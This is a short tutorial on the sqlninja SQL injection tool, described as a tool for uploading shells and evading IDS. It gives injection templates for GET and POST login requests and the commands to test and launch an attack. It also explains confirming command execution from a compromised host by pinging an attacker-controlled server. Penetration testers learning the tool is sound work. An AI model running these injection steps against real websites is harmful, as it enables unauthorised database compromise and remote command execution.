# [sqlninja](http://sqlninja.sourceforge.net)

SQL injection tool for uploading shells and evading network IDS systems.

## Configuration & Usage

Before we can use Sqlninja, we need to define the SQL configuration file. This will contain all the information about the URL, the type of HTTP method, session cookies, and browser agents.

After a configuration file is created, we can run Sqlninja with: `sqlninja -mt -f sqlninja.conf`. This says to run Sqlninja using the test mode to see if the injection works with the configuration file we just created. If you are lucky and do find a alid SQLi, you can start to attack the database with `sqlninja f sqlninja.conf -m f`.

Since with the command line console created by Sqlninja doesn't show the responses from commands, we need to validate that our commands are successfully executing. The best way is by putting `tcp-dump` to listen for pings on a server we owned publicly available on the Internet. By doing so, we can easily validate if our server is responding to pings (ICMP is generally allowed outbound and is less likely to trigger IDS/IPS signatures). `tcpdump -nnvXSs 0 -c2 icmp` will log any pings sent to my server and I'll be able to validate that the server can talk outbound and that my commands are working. On the compromised SQLi host I execute a simple ping back to my server. If it is successfull, *tcpdump* will see the ICMP request.

Command line SQLi attacks can be run with: `sqlninja -f sqlninja.conf -m c`.

### Getting configuration

You can load up *Burp Suite* and turn the proxy intercept on the request where the vulnerable field is passed. Identify the POST parameter values.

* The HTTP Method (GET/POST) needs to be modified to include the full URL.
* You have to define which parameters to fuzz by adding the `__SQL2INJECT__` string.
* Sometimes you may need to try the attack by first closing the vulnerable SQL parameter. This can done with ticks, quotes, or semi-colons.

## GET parameter example

* `gedit ~/Desktop/sql_get.conf`
* Enter the following into the configuration file and save it:

```
--httprequest_start--

GET http://site.com/wfLogin.aspx?user=test';__SQL2INJECT__&pass=test';__SQL2INJECT__HTTP/1.0

Host: site.com
User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
Accept: text/xml, application/xml, text/html; q=00.9, text/plain; q=0.8, image/png,*/*
Accept-Language: ...
Accept-Charset: ...
Content-Type: application/x-www-form-urlencoded
Cookie: ...
Connection: close

--httprequest_end--
```

## POST parameter example

* `gedit ~/Desktop/sql_post.conf`
* Enter the following into the configuration file and save it:

```
--httprequest_start--

POST http://site.com/wfLogin.aspx HTTP/1.0

...
username=test';__SQL2INJECT__&password=test';__SQL2INJECT__

--httprequest_end--
```
